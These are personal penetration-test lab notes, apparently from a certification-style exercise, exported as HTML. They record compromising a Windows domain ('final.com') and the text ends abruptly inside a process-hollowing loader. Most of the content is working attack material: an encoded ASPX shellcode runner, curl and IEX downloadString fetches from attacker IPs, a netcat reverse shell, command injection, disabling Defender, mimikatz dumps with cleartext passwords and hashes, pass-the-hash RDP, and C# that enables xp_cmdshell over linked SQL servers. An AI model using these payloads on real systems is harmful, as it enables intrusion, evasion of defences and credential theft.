<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>06</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>06</h1><br/><p><ul><li>sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f aspx -o tmp.aspx  </li><li>encrypt the payload via ceasar encryption </p><p></li></ul><div class="codebox"><pre>using System;<br />using System.Collections.Generic;<br />using System.Linq;<br />using System.Text;<br />using System.Threading.Tasks;<br />namespace CaesarEncrypt<br />{<br />class Program<br />{<br />static <span style="color:#7f0044;font-weight:400">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />{<br /><span style="color:#7f0044;font-weight:400">byte</span>[] buf <span style="color:#ff9d00;font-weight:700">=</span> new <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#333333;font-weight:400">685</span>] {shellcodeHere };<br /><span style="color:#7f0044;font-weight:400">byte</span>[] encoded <span style="color:#ff9d00;font-weight:700">=</span> new <span style="color:#7f0044;font-weight:400">byte</span>[buf.Length];<span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span>; i &lt; buf.Length; i<span style="color:#ff9d00;font-weight:700">++</span>)<br />{<br />encoded[i] <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#7f0044;font-weight:400">byte</span>)(((uint)buf[i] <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">5</span>) &amp; <span style="color:#333333;font-weight:400">0xFF</span>);<br />}<br />StringBuilder hex <span style="color:#ff9d00;font-weight:700">=</span> new StringBuilder(encoded.Length <span style="color:#ff9d00;font-weight:700">*</span> <span style="color:#333333;font-weight:400">2</span>);<br /><span style="color:#ff9d00;font-weight:700">foreach</span> (<span style="color:#7f0044;font-weight:400">byte</span> b <span style="color:#ff9d00;font-weight:700">in</span> encoded)<br />{<br />hex.AppendFormat(<span style="color:#3ad900;font-weight:400">&quot;0x{0:x2}, &quot;</span>, b);<br />}<br />Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;The payload is: &quot;</span> <span style="color:#ff9d00;font-weight:700">+</span> hex.ToString());<br />}<br />}<br />}</pre></div></p><p></p><p>then in asp shellcode I modify it to </p><p># modify buff_len</p><p><div class="codebox"><pre>&lt;<span style="color:#ff9d00;font-weight:700">%</span>@ Page Language<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;C#&quot;</span> AutoEventWireup<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;true&quot;</span> <span style="color:#ff9d00;font-weight:700">%</span>&gt;<br />&lt;<span style="color:#ff9d00;font-weight:700">%</span>@ Import Namespace<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;System.IO&quot;</span> <span style="color:#ff9d00;font-weight:700">%</span>&gt;<br />&lt;script runat<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;server&quot;</span>&gt;<br />    private static <span style="color:#7f0044;font-weight:400">Int32</span> MEM_COMMIT<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">0x1000</span>;<br />    private static IntPtr PAGE_EXECUTE_READWRITE<span style="color:#ff9d00;font-weight:700">=</span>(IntPtr)<span style="color:#333333;font-weight:400">0x40</span>;<br /><br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,<span style="color:#7f0044;font-weight:400">Int32</span> flAllocationType,IntPtr flProtect);<br /><br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr <span style="color:#ff9d00;font-weight:700">param</span>,<span style="color:#7f0044;font-weight:400">Int32</span> dwCreationFlags,ref IntPtr lpThreadId);<br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError <span style="color:#ff9d00;font-weight:700">=</span> true, ExactSpelling <span style="color:#ff9d00;font-weight:700">=</span> true)]<br />    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);<br /><br />    [System.Runtime.InteropServices.DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />    private static extern IntPtr GetCurrentProcess();<br />    protected <span style="color:#7f0044;font-weight:400">void</span> Page_Load(object sender, EventArgs e)<br />    {<br />        IntPtr mem <span style="color:#ff9d00;font-weight:700">=</span> VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, <span style="color:#333333;font-weight:400">0x1000</span>, <span style="color:#333333;font-weight:400">0x3000</span>, <span style="color:#333333;font-weight:400">0x4</span>, <span style="color:#333333;font-weight:400">0</span>);<br />        <span style="color:#ff9d00;font-weight:700">if</span>(mem <span style="color:#ff9d00;font-weight:700">==</span> null)<br />        {<br />            <span style="color:#ff9d00;font-weight:700">return</span>;<br />        }<br />        <span style="color:#7f0044;font-weight:400">byte</span>[] anQJWGtXVfgE <span style="color:#ff9d00;font-weight:700">=</span> new <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#0088ff;font-weight:400">$buff_len</span>] {encrypted shellcode here};<br /><br />                    <span style="color:#ff9d00;font-weight:700">for</span>(<span style="color:#7f0044;font-weight:400">int</span> i <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span>; i &lt; anQJWGtXVfgE.Length; i<span style="color:#ff9d00;font-weight:700">++</span>)<br />            {<br />                anQJWGtXVfgE[i] <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#7f0044;font-weight:400">byte</span>)(((uint)anQJWGtXVfgE[i] <span style="color:#ff9d00;font-weight:700">-</span> <span style="color:#333333;font-weight:400">5</span>) &amp; <span style="color:#333333;font-weight:400">0xFF</span>);<br />            }<br /><br />        IntPtr gh9Sh57 <span style="color:#ff9d00;font-weight:700">=</span> VirtualAlloc(IntPtr.Zero,(UIntPtr)anQJWGtXVfgE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br />        System.Runtime.InteropServices.Marshal.<span style="color:#ff9d00;font-weight:700">Copy</span>(anQJWGtXVfgE,<span style="color:#333333;font-weight:400">0</span>,gh9Sh57,anQJWGtXVfgE.Length);<br />        IntPtr fXhVkDyOY <span style="color:#ff9d00;font-weight:700">=</span> IntPtr.Zero;<br />        IntPtr lx5Qh_ <span style="color:#ff9d00;font-weight:700">=</span> CreateThread(IntPtr.Zero,UIntPtr.Zero,gh9Sh57,IntPtr.Zero,<span style="color:#333333;font-weight:400">0</span>,ref fXhVkDyOY);<br />    }<br />&lt;<span style="color:#ff9d00;font-weight:700">/</span>script&gt;<br /></pre></div></p><p></p><p><ul><li>trigger them via $url/file.aspx</li><li>getsystem</li><li><strong>Flag 1</strong>: 33df0b2aa946c31e56be5bf7bae48c5e (admin :181=web05)</li><li>flag 2 : eb69f0ecbba2dddfa438db35052a6d84 (local.txt : 181)</li></ul></p><p></p><p></p><p><h2>Persistence admin</h2></p><p><ul><li>net user administrator passw0rd<strong><span style="color:#ff9d00;">!</span></strong> </li><li>diable windows defender (virus &amp; threat protection)</li></ul></p><p></p><p><h2>Loots</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## mimikatz secrets give us a domain user </span><br /><br />adminWebSvc  @final.com  FGjksdff89sdfj<br /><br /><span style="color:#0088ff;font-weight:400">## hashes.kerberoast </span><br /><br />tommy          <span style="color:#ff9d00;font-weight:700">*</span> NTLM     <span style="color:#ff9d00;font-weight:700">:</span> 5ad27ee8000951e0669fab25f73f9d8a<br />tommy <span style="color:#ff9d00;font-weight:700">:</span> 89dsfsji43A<br /><span style="color:#0088ff;font-weight:400"># from web06</span><br />apacheSvc @dev.final.com<span style="color:#ff9d00;font-weight:700">:</span> fgodSDOJFSdjk53df<br />sqlsvc01@dev.final.com <span style="color:#ff9d00;font-weight:700">:</span> FDksld894rkjlsdfg<br /><br /><span style="color:#0088ff;font-weight:400">## sql03</span><br />sqlsvc03@final.com<br />cur<span style="color:#ff9d00;font-weight:700">/</span>text<span style="color:#ff9d00;font-weight:700">:</span> 89sdfDSFksolds34f<br />Administrator<br />8388d07604009d14cbb78f7d37b9e887<br /><br /><span style="color:#0088ff;font-weight:400">## sql11</span><br /><span style="color:#ff9d00;font-weight:700">*</span> Username <span style="color:#ff9d00;font-weight:700">:</span> tina<br />         <span style="color:#ff9d00;font-weight:700">*</span> Domain   <span style="color:#ff9d00;font-weight:700">:</span> FINAL.COM<br />         <span style="color:#ff9d00;font-weight:700">*</span> Password <span style="color:#ff9d00;font-weight:700">:</span> df54ikosdfGFkoal</pre></div> </p><p></p><p></p><p><h2>Post exploitation</h2><ul><li>sharpHound.exe </li><li>kerberoasting sqlsvc03@final.com ; sqlsvc11@final.com<ul><li>hashcat 13100 (no pass )</li></ul></li><li>bloodhound<ul><li>tina = da</li><li>domains:<ul><li>final.com</li><li>dev.final.com</li></ul></li></ul></li><li>abuse ACL <ul><li>webadmins = seforcechange password on nina </li></ul></li></ul></p><p>$credsrulon = New-Object System.Management.Automation.PSCredential<strong><span style="color:#ff9d00;">(</span></strong><span style="color:#3ad900;">&quot;final.com\adminWebSvc&quot;</span>, <strong><span style="color:#ff9d00;">(</span></strong>ConvertTo-SecureString <span style="color:#3ad900;">&quot;FGjksdff89sdfj&quot;</span> -AsPlainText -Force<strong><span style="color:#ff9d00;">))</span></strong></p><p>$UserPassword = ConvertTo-SecureString <span style="color:#3ad900;">&#39;</span><strong><span style="color:#3ad900;">Password</span></strong><span style="color:#3ad900;">!&#39;</span> -AsPlainText -Force</p><p>Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $credsrulon -Verbose</p><p></p><p><h2>Hosts</h2></p><p></p><p><div class="codebox"><pre>dc01.final.com   <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.180</span><br />sql03.final.com  <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.187</span><br />sql11.final.com  <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.188</span><br />web05.final.com  <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.181</span><br />web05.final.com  <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">161.181</span><br />jump03.final.com <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.183</span><br />ansible06        <span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.184</span></pre></div>*</p><p></p><p></p><p></p><p><h2>Port scan</h2></p><p></p><p> chisel</p><p> </p><p> Invoke-portscan for ports </p><p>proxychains nmap -p22 ansible06 -vvv -sC -sV -oN nmap/ansible06</p><p></p><p></p><p><h2>Lateral movement jump03</h2><ul><li>nina can RDP </li><li>proxychains xfreerdp /u:nina@final.com /v:jump03.final.com /p:&#39;Password!&#39; /dynamic-resolution +clipboard</li><li>flags<ul><li>local.txt : <strong>911430e89bd98320be4673732818eaa0</strong></li></ul></li></ul></p><p></p><p></p><p></p><p><ul><li>run sharphoud with new creds <ul><li>.\SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn --domain dev.final.com --</li></ul></li></ul></p><p>ldapusername nina --ldappassword &#39;Password!&#39;<ul><li>.\SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn --domain final.com --</li></ul></p><p>ldapusername nina --ldappassword &#39;Password123!&#39;</p><p></p><p></p><p></p><p><h2>Privesc jump03</h2></p><p><ul><li>\\web05\temp</li><li></li></ul><img src="images/367-1.png" alt="images/367-1.png" /></p><p></p><p>set service to manual or automatic  via GUI <img src="images/367-2.png" alt="images/367-2.png" /></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sc</span> config <span style="color:#3ad900;font-weight:400">&quot;SNMPTRAP&quot;</span> obj<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;NT AUTHORITY\SYSTEM&quot;</span> password<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;&quot;</span><br /><span style="color:#ff9d00;font-weight:700">sc</span> config <span style="color:#3ad900;font-weight:400">&quot;SNMPTRAP&quot;</span> binPath<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;net localgroup Administrators final\nina /add&quot;</span><br /><span style="color:#ff9d00;font-weight:700">sc</span> stop <span style="color:#3ad900;font-weight:400">&quot;SNMPTRAP&quot;</span><br /><span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">start</span> <span style="color:#3ad900;font-weight:400">&quot;SNMPTRAP&quot;</span></pre></div></p><p></p><p><ul><li>flag <strong>a42c5c44068dd25f95fb11f5d80acfab</strong> (admin jump)</li></ul></p><p><h2>Loots  jump</h2></p><p><ul><li>mimikatz_dump_jump.txt</li><li>lsadump::secrets = tommy pass </li></ul></p><p></p><p></p><p><h2>Ansible06</h2><ul><li>after getting id_rsa from jump03</li><li><strong>sudo proxychains  ssh -i id_rsa_tommy final\\tommy@ansible06 </strong></li><li><strong>flag.txt</strong>: 73f143b0fdea5233cf47393007ad054d (local)<ul><li>749c33145f9e9c342f4d04150f361593 (admin)</li></ul></li><li>root <strong>sudo lua -e &#39;os.execute(&quot;/bin/bash&quot;)&#39;</strong></li></ul></p><p></p><p><h2>Enumerate ansible</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cat</span> /etc/ansible/hosts<br /><span style="color:#0088ff;font-weight:400">## [appservers]</span><br /><span style="color:#0088ff;font-weight:400">### appserver05.dev.final.com</span><br /><span style="color:#ff9d00;font-weight:700">ls</span> /etc/passwd <span style="color:#0088ff;font-weight:400"># identify ansiblesvc (home contain secret key </span><br /><br /><span style="color:#0088ff;font-weight:400">## search for playbooks </span><br /><span style="color:#ff9d00;font-weight:700">ls</span> /opt<br /><span style="color:#0088ff;font-weight:400">## we can execute commands on appservers </span><br />ansible appservers -a <span style="color:#3ad900;font-weight:400">&quot;whoami&quot;</span> --become</pre></div></p><p></p><p></p><p></p><p><h2>Appservers.dev.final.com</h2> (172.16.175.197)</p><p></p><p>flag : <strong>6b93f09d3864db4edc6c6c96d546ae43</strong> (root)</p><p><ul><li>get shell</li><li>In .bash_history of user ansiblesvc, we find:</li></ul></p><p>	ssh-copy-id ansiblesvc@appserver05.dev.final.com</p><p>	ssh ansiblesvc@appserver05.dev.final.com</p><p></p><p></p><p><h2>Enumeration</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># history </span><br />172.16.175.192 <span style="color:#ff9d00;font-weight:700">:</span> dc02.dev.final.com</pre></div></p><p></p><p></p><p><h2>SQL03 &amp; SQL11</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## creds found from jump03</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> proxychains mssqlclient.py tommy:89dsfsji43A@sql03.final.com -port 1433 -windows-auth<br /><span style="color:#ff9d00;font-weight:700">sudo</span> proxychains mssqlclient.py tommy:89dsfsji43A@sql11.final.com -port 1433 -windows-auth<br />mssqlclient.py sqlsvc03:89sdfDSFksolds34f@sql03.final.com -port 1433 -windows-auth<br />mssqlclient.py sqlsvc01:FDksld894rkjlsdfg@sql03.final.com -port 1433 -windows-auth<br /><span style="color:#0088ff;font-weight:400">## we do not have rights  to enable xp_cmdshell =&gt; </span><br /><span style="color:#0088ff;font-weight:400">## we need to relay creds (search for a server where smb signing is disabled e.g web06</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> proxychains ntlmrelayx.py --no-http-server -smb2support -t smb://web06.final.com<br /><span style="color:#0088ff;font-weight:400">## on sql server </span><br />EXECUTE <span style="color:#333333;font-weight:400">(&#39;master.sys.xp_dirtree &quot;\\192.168.45.232\a&quot;&#39;)</span><br /><br /><span style="color:#0088ff;font-weight:400">## DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span></pre></div></p><p></p><p></p><p></p><p><h2>WEB06</h2><ul><li>Port 8081 seems o be only accessible to dev.final.com </li><li>we can setup proxy from appservers.dev.final.com </li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## on appserver05 </span><br /><span style="color:#ff9d00;font-weight:700">ssh-keygen</span><br /><span style="color:#ff9d00;font-weight:700">cd</span> .ssh<br /><span style="color:#ff9d00;font-weight:700">cat</span> id_rsa.pub <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> authorized_keys <br /><span style="color:#0088ff;font-weight:400">## set up sshutlle</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> proxychains sshuttle -v -e <span style="color:#3ad900;font-weight:400">&quot;ssh -i id_rsa_root&quot;</span> -r root@172.16.175.197 172.16.175.0/24<br /><span style="color:#0088ff;font-weight:400">## now you can connect without proxychains </span><br /><br /><span style="color:#0088ff;font-weight:400">## RCE </span><br />GET /?ipaddr=127.0.0.1<span style="color:#ff9d00;font-weight:700">|whoami</span> <br /><span style="color:#0088ff;font-weight:400">## reverse shell attempt 1</span><br /><span style="color:#ff9d00;font-weight:700">|</span>curl http://192.168.45.226/nc64.exe -O c:<span style="color:#333333;font-weight:400">\w</span>indows<span style="color:#333333;font-weight:400">\t</span>asks<span style="color:#333333;font-weight:400">\n</span>c64.exe<br />c:<span style="color:#333333;font-weight:400">\w</span>indows<span style="color:#333333;font-weight:400">\t</span>asks<span style="color:#333333;font-weight:400">\n</span>c64.exe 192.168.45.226 443 -e cmd.exe<br /><span style="color:#0088ff;font-weight:400">### nc is removed = we need to inject powershell script maybe also use amsi bypass </span><br />IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object Net.webclient<span style="color:#ff9d00;font-weight:700">)</span>.downloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;http://192.168.X.Y/drop4.ps1&#39;</span><span style="color:#ff9d00;font-weight:700">)</span></pre></div></p><p><ul><li>flag <strong>53af52bd3d2607657fa6209ad564426b</strong> (proof.txt)</li></ul></p><p></p><p><ul><li>as admin disable defender <ul><li>&amp;&amp; powershell -c “set-Mppreferences -Disable...”</li></ul></li><li>127.0.0.1 &amp;&amp; powershell -c IEX(New-Object Net.WebClient).downloadString(&#39;http://192.168.45.153/rev.ps1&#39;)</li><li>RDP via sqlsvc01 account </li></ul></p><p><ul><li>login via rdp to administrator <ul><li>enable rdp pth </li><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">New-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot;</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;DisableRestrictedAdmin&quot;</span> <span style="color:#333333;font-weight:400">-Value</span> <span style="color:#3ad900;font-weight:400">&quot;0&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>PropertyType DWORD <span style="color:#ff9d00;font-weight:700">-</span>Force<br />xfreerdp <span style="color:#ff9d00;font-weight:700">/</span>v<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.194</span> <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>administrator <span style="color:#ff9d00;font-weight:700">/</span>pth<span style="color:#ff9d00;font-weight:700">:</span>f99529e42ee77dc4704c568ba9320a34 <span style="color:#ff9d00;font-weight:700">+</span>compression <span style="color:#ff9d00;font-weight:700">+</span>clipboard <span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">dynamic-resolution</span> <span style="color:#ff9d00;font-weight:700">+</span><span style="color:#00117f;font-weight:400">toggle-fullscreen</span> <span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">cert-ignore</span><br /><span style="color:#0088ff;font-weight:400">## after getting admin of sql03</span><br />xfreerdp <span style="color:#ff9d00;font-weight:700">/</span>v<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">172.16</span>.<span style="color:#333333;font-weight:400">161.187</span> <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>administrator <span style="color:#ff9d00;font-weight:700">/</span>pth<span style="color:#ff9d00;font-weight:700">:</span>8388d07604009d14cbb78f7d37b9e887 <span style="color:#ff9d00;font-weight:700">+</span>compression <span style="color:#ff9d00;font-weight:700">+</span>clipboard <span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">dynamic-resolution</span> <span style="color:#ff9d00;font-weight:700">+</span><span style="color:#00117f;font-weight:400">toggle-fullscreen</span> <span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">cert-ignore</span><br />xfreerdp <span style="color:#ff9d00;font-weight:700">/</span>v<span style="color:#ff9d00;font-weight:700">:</span>sql11.final.com <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>administrator <span style="color:#ff9d00;font-weight:700">/</span>pth<span style="color:#ff9d00;font-weight:700">:</span>8388d07604009d14cbb78f7d37b9e887 <span style="color:#ff9d00;font-weight:700">+</span>compression <span style="color:#ff9d00;font-weight:700">+</span>clipboard <span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">dynamic-resolution</span> <span style="color:#ff9d00;font-weight:700">+</span><span style="color:#00117f;font-weight:400">toggle-fullscreen</span> <span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">cert-ignore</span></pre></div></p><p><ul><li>ENUMERATE linked servers and authentication impersonation =&gt; admin has sa rules + linked sql = sql03</li><li>WE needed to enable rpcout </p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Data.SqlClient;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> MSSQL<br />{<br />	<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />	{<br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> String executeQuery(String query, SqlConnection con)<br />		{<br />			SqlCommand cmd = <span style="color:#ff9d00;font-weight:700">new</span> SqlCommand(query, con);<br />			SqlDataReader reader = cmd.ExecuteReader();<br />			<span style="color:#ff9d00;font-weight:700">try</span><br />			{<br />				String result = <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />				<span style="color:#ff9d00;font-weight:700">while</span> (reader.Read() == <span style="color:#ff0044;font-weight:400">true</span>)<br />				{<br />					result += reader[<span style="color:#ff0044;font-weight:400">0</span>] + <span style="color:#3ad900;font-weight:400">&quot;\n&quot;</span>;<br />				}<br />				reader.Close();<br />				<span style="color:#ff9d00;font-weight:700">return</span> result;<br />			}<br />			<span style="color:#ff9d00;font-weight:700">catch</span><br />			{<br />				<span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />			}<br />		}<br /><br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> getGroupMembership(String groupToCheck, SqlConnection con)<br />		{<br />			String res = executeQuery($<span style="color:#3ad900;font-weight:400">&quot;SELECT IS_SRVROLEMEMBER(&#39;{groupToCheck}&#39;);&quot;</span>, con);<br />			<span style="color:#7f0044;font-weight:400">int</span> role = <span style="color:#7f0044;font-weight:400">int</span>.Parse(res);<br />			<span style="color:#ff9d00;font-weight:700">if</span> (role == <span style="color:#ff0044;font-weight:400">1</span>)<br />			{<br />				Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[+] User is a member of the &#39;{groupToCheck}&#39; group.&quot;</span>);<br />			}<br />			<span style="color:#ff9d00;font-weight:700">else</span><br />			{<br />				Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[-] User is not a member of the &#39;{groupToCheck}&#39; group.&quot;</span>);<br />			}<br />		}<br /><br />		<span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />		{<br />			String serv = <span style="color:#3ad900;font-weight:400">&quot;web06.dev.final.com&quot;</span>;<br />			String db = <span style="color:#3ad900;font-weight:400">&quot;master&quot;</span>;<br />			String conStr = $<span style="color:#3ad900;font-weight:400">&quot;Server = {serv}; Database = {db}; Integrated Security = True;&quot;</span>;<br />			SqlConnection con = <span style="color:#ff9d00;font-weight:700">new</span> SqlConnection(conStr);<br /><br />			<span style="color:#ff9d00;font-weight:700">try</span><br />			{<br />				con.Open();<br />				Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[+] Authenticated to MSSQL Server!&quot;</span>);<br />			}<br />			<span style="color:#ff9d00;font-weight:700">catch</span><br />			{<br />				Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[-] Authentication failed.&quot;</span>);<br />				Environment.Exit(<span style="color:#ff0044;font-weight:400">0</span>);<br />			}<br /><br /><br />			<span style="color:#0088ff;font-weight:400">// Impersonate login and get login information</span><br />	<br />			String res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE AS LOGIN = &#39;sa&#39;;&quot;</span>, con);<br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered impersonation.&quot;</span>);<br />			<br />	<br />			<span style="color:#0088ff;font-weight:400">// Execute on linked server</span><br />			 res = executeQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE as LOGIN = &#39;sa&#39;;EXEC sp_serveroption &#39;SQL03&#39;, &#39;rpc out&#39;, &#39;true&#39;;EXEC (&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;RECONFIGURE;&#39;) AT SQL03;EXEC(&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39;;&#39;) AT SQL03&quot;</span>, con);<br /><br />			Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Triggered command. Result: {res}&quot;</span>);<br />		}<br />	}<br />}</pre></div></p><p></p><p></p><p></p><p></p><p><h2>Bypassed through Process Hollowing</h2></p><p>powershell.exe iwr -uri <a href="http://192.168.45.153/apple.exe">http://192.168.45.153/apple.exe</a> -o c:\\\\Windows\\tasks\\apple.exe; c:\\\\Windows\\tasks\\apple.exe</p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> ProcessHollowing<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">const</span> <span style="color:#7f0044;font-weight:400">uint</span> CREATE_SUSPENDED = <span style="color:#ff0044;font-weight:400">0x4</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">const</span> <span style="color:#7f0044;font-weight:400">int</span> PROCESSBASICINFORMATION = <span style="color:#ff0044;font-weight:400">0</span>;<br /><br />        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> ProcessInfo<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hProcess;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hThread;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 ProcessId;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 ThreadId;<br />        }<br /><br />        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> StartupInfo<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> cb;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpReserved;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpDesktop;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpTitle;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwX;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwY;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwXSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwYSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span 